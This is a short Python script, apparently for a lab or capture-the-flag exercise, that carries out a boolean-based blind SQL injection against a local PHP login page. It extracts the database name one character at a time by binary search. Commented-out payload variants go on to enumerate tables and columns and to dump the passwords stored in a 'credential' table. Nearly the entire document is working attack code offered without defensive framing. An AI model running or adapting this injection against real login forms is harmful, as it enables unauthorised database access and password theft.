import requests

url = 'http://localhost/bool.php'
payload = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.{}'
passwd = ''
dblen = 0

# 爆数据库长
# for i in range(1, 20):
#     sqlstr = u"a' or if(length(database())={},1,0)#"
#     params = {"username": sqlstr.format(i), "Password": ""}
#
#     ans = requests.get(url, params=params)
#     if "User not exist!" not in ans.text:
#         dblen = i
#         break

for i in range(1, 80):
    low = 0
    high = 127

    while True:
        j = (low + high)//2
        # 爆数据库名：
        sqlstr = u"a' or if(ascii(substr(database(), {}, 1))>{}, 1, 0)#"
        # 爆表名：sqlstr = u"a' or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), {}, 1))>{}, 1, 0)#"
        # 爆字段名：sqlstr = u"a' or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='credential'), {}, 1))>{}, 1, 0)#"
        # 爆数据：sqlstr = u"a' or if(ascii(substr((select group_concat(Password) from credential), {}, 1))>{}, 1, 0)#"
        params = {"username": sqlstr.format(i, j), "Password": ""}

        ans = requests.get(url, params=params)
        if 'User not exist!' in ans.text:
            if high == low+1:
                passwd += chr(low)
                print(passwd)
                break
            high = j
        else:
            if high == low+1:
                passwd += chr(high)
                print(passwd)
                break
            low = j

print(passwd)
print("error!length is too short!")
